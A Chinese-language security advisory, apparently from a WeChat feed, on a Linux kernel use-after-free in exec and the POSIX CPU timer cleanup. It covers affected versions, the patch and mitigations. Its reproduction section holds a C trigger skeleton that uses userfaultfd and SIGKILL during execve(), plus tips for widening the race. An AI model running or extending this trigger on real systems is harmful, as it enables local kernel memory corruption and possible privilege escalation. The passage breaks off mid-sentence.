---
title: Linux 内核里躺了六年半的一个清理顺序问题
url: https://mp.weixin.qq.com/s/JQBXTCTLbwyYsJVSkXID5Q
source: Doonsec's feed
date: 2026-10-30
fetch_date: 2026-10-31T07:42:34.347318
---

# Linux 内核里躺了六年半的一个清理顺序问题

# Linux 内核里躺了六年半的一个清理顺序问题

原创

Jony
Jony

密雾九尾

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

fs/exec.c 的审计重点历来集中在成功路径上的 cred/mm/files 状态迁移，而 bprm->point\_of\_no\_return 置位之后的错误分支长期被当作"仅影响进程存亡"的边角逻辑。CVE-2026-98260 正落在这个被低估的区间：

一个 per-thread POSIX CPU timer 的队列节点，在 k\_itimer 释放时仍处于 posix\_cputimers 的 rbtree 之

中，最终在任务回收路径上被再次摘链，构成 use-after-free。

基本信息

|  |  |
| --- | --- |
| 属性 | 值 |
| CVE | CVE-2026-98260 |
| 缺陷类型 | Use-after-free（timerqueue 节点悬垂） |
| 受影响组件 | fs/exec.c 、 kernel/time/posix-cpu-timers.c |
| 触发前提 | 本地低权限进程可执行 execve() |
| CVSS 3.1 | 7.8 — AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 报告者 | Hyunwoo Kim |
| 补丁处理 | Thomas Gleixner 审阅，调整清理点位置 |

一、影响范围

缺陷引入基线为 v5.7。该版本区间奠定了 de\_thread() 的线程组接管语义与 posix\_cputimers 的节点挂载方

式，此后两者的交互不变，因此 v5.7 之后的全部主线版本在语义上均受影响。

稳定分支的修复边界如下：

|  |  |  |
| --- | --- | --- |
| 分支 | 受影响范围 | 修复版本 |
| mainline | < 7.3 | 7.3 |
| 7.2.x | < 7.2.8 | 7.2.8 |
| 6.18.x | < 6.18.54 | 6.18.54 |
| 6.12.x | < 6.12.112 | 6.12.112 |
| 6.6.x | < 6.6.158 | 6.6.158 |

各发行版已陆续放出公告：AlmaLinux 发布了 ALSA-2026:85321 与 ALSA-2026:86033 两条安全通告，

RHEL 系与 SUSE 系预计随后同步 errata。资产侧应先完成内核基线盘点，再按"是否承载不受信本地执行主

体"收窄优先级：多租户宿主机、CI runner、构建机、以及允许任意本地代码执行的容器节点属于高风险面；

仅对外暴露网络服务且本地执行主体可信的节点，可按常规节奏并轨。

需要区分两件事： C:H/I:H/A:H 是评分模型对内存破坏上限的赋值，CNA 记录本身只确认到 UAF 原语，未

公开完整的 LPE 利用链；与此同时，UAF 在可控 slab 布局下的实际影响由分配器状态决定，不由 CVSS 向

量决定，不宜以"未公开利用"为由降级处置。

二、漏洞描述

数据结构的生命周期约定

timer\_create(CLOCK\_THREAD\_CPUTIME\_ID, ...) 创建的 k\_itimer 通过 it.cpu.pid 持有目标线程的 PID 引

用。当 timer\_settime() 经 arm\_timer() 完成挂载后，其 timerqueue 节点被插入目标线程 signal\_struct

中 posix\_cputimers 的 rbtree；此后内核通过 pid\_task(timer->it.cpu.pid, PIDTYPE\_PID) 反查绑定的 task

\_struct 。

该约定隐含一个前置条件：PID 到 task 的映射在整个 armed 周期内保持稳定。 exchange\_tids() 恰好破坏

了这一前提。

失效路径

非首领线程 B 发起 execve() 后， de\_thread() 执行 exchange\_tids(B, leader) ，将原 PID 的所有权转移给

线程组首领，B 则接替其位置。此时：

1. pid\_task(timer->it.cpu.pid, PIDTYPE\_PID) 返回 NULL ；

2. 节点仍链接在 B 的 timerqueue 中，而 B 尚未终结；

3. timer\_lock\_sighand() 将"反查失败"解释为"节点已出队"，据此跳过摘链，形成一致性缺口。

该缺口在正常路径下不可观测，因为 begin\_new\_exec() 会在 exec\_task\_namespaces() 之后调用 posix\_cpu\_t

imers\_exit(me) ，将残留节点移除。

问题在于 bprm->point\_of\_no\_return 的置位点在 de\_thread() 之前。 unshare\_files() 、 set\_mm\_exe\_file()

（ ENOMEM ）、 exec\_mmap() 中 mmap\_read\_lock\_killable() （ -EINTR ， signal\_pending() 为真时）、 exec\_t

ask\_namespaces() （ ENOSPC ）任一失败，即把任务直接推入 do\_exit() ，绕过上述清理：

```
thread B (non-leader)├─ [parent] timer_create(CLOCK_THREAD_CPUTIME_ID) + timer_settime()│ └─ arm_timer(): node ∈ B->signal->posix_cputimers│└─ B: execve()├─ de_thread()│ └─ exchange_tids(B, leader): PID ownership transferred├─ release_task(leader)│ └─ __exit_signal() → posix_cpu_timers_exit(leader)│ (drains leader's queue only)├─ exec_mmap() → mmap_read_lock_killable(old_mm) → -EINTR├─ get_signal() → do_exit()│ └─ exit_itimers() → posix_timer_delete()│ → posix_cpu_timer_del() → posix_timer_unhash_and_free()│ (k_itimer freed; node still linked)│└─ wait4() → release_task(B)└─ posix_cpu_timers_exit(B) → cleanup_timerqueue()→ timerqueue_del() [UAF: dereference freed node]
```

释放点与摘链点在时序上解耦： posix\_timer\_unhash\_and\_free() 归还 k\_itimer 时节点仍处于链接态，而 cl

eanup\_timerqueue() 在后续回收阶段对同一节点执行 rbtree 删除，形成典型的"先释放、后解链"（free

then-unlink）模式。该模式的危害不在于写入内容，而在于对已归还 slab 对象的读改写——一旦该 slab 被

重分配， timerqueue\_del() 的再平衡操作即具备任意写潜力。

修复方案本身因此刻意保守：不引入引用计数、不改动 timer\_lock\_sighand() 的判空语义，仅将既有的清理

调用前移，使其位于所有失败分支的支配域内。补丁说明中的处理意见即为此意——\*Move the cleanup right after de\_thread()\*。

三、修复建议

3.1 升级至修复版本

优先采用发行版内核更新通道；自维护内核对照下列 stable 树 commit（五则分别对应 6.6.158 / 6.12.112 /

6.18.54 / 7.2.8 / 7.3 五个修复点，对应关系以各分支 release 记录为准）：

|  |  |
| --- | --- |
| # | Commit |
| 1 | 6f1977cea3e8：https://git.kernel.org/stable/c/6f1977cea3e85cd8ab55fb337d3e1725fe61d1ce |
| 2 | d9ae467e617c https://git.kernel.org/stable/c/d9ae467e617ca29b825493a362bf0d75ad5f4ac3 |
| 3 | 75aa08b93c65 https://git.kernel.org/stable/c/75aa08b93c65766040f9ca99f41ac85ad22596b6 |
| 4 | d602877baf36 https://git.kernel.org/stable/c/d602877baf36c43c788a5f472c977e0be414029f |
| 5 | acb03d388181 https://git.kernel.org/stable/c/acb03d3881818581052924a9bbbe92b8741ed448 |

3.2 补丁语义

以下为按补丁说明整理的等价改动，具体行号与上下文需以对应分支为准：

```
--- a/fs/exec.c+++ b/fs/exec.c@@ int begin_new_exec(struct linux_binprm *bprm)de_thread(me);+ /*+ * de_thread() 已重排 PID 归属，残留 node 必须在此处摘除，+ * 以免后续失败路径绕过 posix_cpu_timers_exit()。+ */+ posix_cpu_timers_exit(me);...retval = exec_task_namespaces();if (retval)return retval;- posix_cpu_timers_exit(me);...
```

改动面收敛在 begin\_new\_exec() 内，无 ABI 与数据结构变更；回归风险集中在 exec 路径，建议覆盖容器生

命周期、高并发 fork/exec 负载及 setsid/unshare 组合场景。

3.3 临时缓解

该缺陷位于通用执行路径，缺乏具备针对性的运行时缓解手段，可行措施以攻击面收敛为主：

关闭非特权 user namespace（ user.max\_user\_namespaces=0 ）仅对依赖 namespace 创建的利用链有

效，不构成对原语的阻断。

在具备强制访问控制的环境下，以 seccomp 限制非首领线程的 execve() 属正向实践，但与多数语言运

行时的线程模型不兼容，落地成本需评估。

对无法及时换版的自维护内核，可单独 cherry-pick 上述单点改动，改动量极小。

版本核验：

```
uname -rdnf updateinfo list cves 2>/dev/null | grep -i CVE-2026-98260 # RHEL 系apt list --upgradable 2>/dev/null | grep -i linux-image # Debian 系
```

四、漏洞复现

4.1 触发条件建模

复现的核心不在逻辑构造，而在竞态窗口的可控性。 exec\_mmap() 中的 mmap\_read\_lock\_killable(old\_mm) 是

唯一的可睡眠阻塞点，因而也是最合适的失败注入锚点：使 old\_mm->mmap\_lock 处于写持有状态，再向执行

execve() 的线程投递致命信号，返回 -EINTR 即可将控制流精确导向那条未经清理的 do\_exit() 。

建议在启用 CONFIG\_KASAN=y 的内核上验证（QEMU 环境便于分离宿主机），并保留 CONFIG\_DEBUG\_RBTREE

一类调试选项以增强现场可观测性。

以下为触发骨架，用于验证 UAF 原语的可达性，非完整利用代码。发布前请在自有环境完成实测；本人未执

行该代码，且不建议在此基础上扩展提权利用链。

4.2 参考代码

```
#define _GNU_SOURCE#include <fcntl.h>#include <pthread.h>#include <signal.h>#include <string.h>#include <sys/ioctl.h>#include <sys/mman.h>#include <sys/syscall.h>#include <sys/wait.h>#include <time.h>#include <unistd.h>#include <linux/userfaultfd.h>static timer_t g_timer;static pid_t g_worker_tid;static volatile int g_locked;/* B：timer 绑定目标，并承担 execve() 的失败注入 */static void *worker_fn(void *arg){pthread_barrier_t *bar = arg;g_worker_tid = syscall(SYS_gettid); /* 必须为非首领线程 tid */pthread_barrier_wait(bar);while (!g_locked) /* 等待 mmap_lock 写持有 */sched_yield();char *const argv[] = { "/bin/true", NULL };char *const envp[] = { NULL };execve("/bin/true", argv, envp); /* 预期于 exec_mmap() 返回 -EINTR */return NULL;}/* 借助 userfaultfd 缺页阻塞维持 mmap_write_lock */static void *locker_fn(void *arg){struct uffdio_api api = { .api = UFFDIO_API, .features = 0 };struct uffdio_register reg;struct uffd_msg msg;int fd;void *map;fd = syscall(SYS_userfaultfd, O_CLOEXEC);ioctl(fd, UFFDIO_API, &api);map = mmap(NULL, 2UL << 20, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);reg.range.start = (unsigned long)map;reg.range.len = 2UL << 20;reg.mode = UFFDIO_REGISTER_MODE_MISSING;ioctl(fd, UFFDIO_REGISTER, &reg); /* 注册期间持有写锁 */g_locked = 1;read(fd, &msg, sizeof(msg)); /* 缺页阻塞：写锁不释放 */for (;;)pause();return NULL;}int main(void){struct sigevent sev = { 0 };struct itimerspec its = { 0 };pthread_barrier_t bar;pthread_t tw, tl;pthread_barrier_init(&bar, NULL, 2);pthread_create(&tw, NULL, worker_fn, &bar);pthread_barrier_wait(&bar);sev.sigev_notify = SIGEV_THREAD_ID;sev.sigev_notify_thread_id = g_worker_tid;sev.sigev_signo = SIGALRM;timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &g_timer);its.it_value.tv_nsec = 1000000; /* arm_timer(): node 入 B 队列 */timer_settime(g_timer, 0, &its, NULL);pthread_create(&tl, NULL, locker_fn, NULL);while (!g_locked)sched_yield();syscall(SYS_tgkill, getpid(), g_worker_tid, SIGKILL);wait(NULL);return 0;}
```

4.3 判据与观测点

命中该缺陷的可靠判据是 KASAN 报告的栈指纹，而非是否发生 panic：

释放侧： exit\_itimers() → posix\_timer\_delete() → posix\_cpu\_timer\_del() → posix\_timer\_unhash\_a

nd\_free()

访问侧： release\_task() → posix\_cpu\_timers\_exit() → cleanup\_timerqueue() → timerqueue\_del()

二者必须同时出现且指向同一 slab 对象，方可确认本次实验命中本 CVE，而非同类竞态。

4.4 工程注意事项

绑定对象必须是非首领线程。若 timer 附着于线程组首领， de\_thread() 不会执行 exchange\_tids() ，前

提不成立。示例中 g\_worker\_tid 由 worker 自身上报，主线程此前的 gettid() 不可复用。

窗口宽度依赖调度稳定性。建议对 worker 与持锁线程分别执行 sched\_setaffinity() 绑定至不同

CPU，避免持锁线程被抢占导致写锁被动释放，破坏阻塞条件。

单次命中概率低，应以"每次独立进程、数千轮迭代"的方式统计，同一进程内重试会引入状态污染。未启用 KASAN 时，现场可能表现为 timerqueue 结构损坏引发的次级崩溃，或以静默方式结束。 timer

queue\_del() 操作的是已归还 slab 的节点...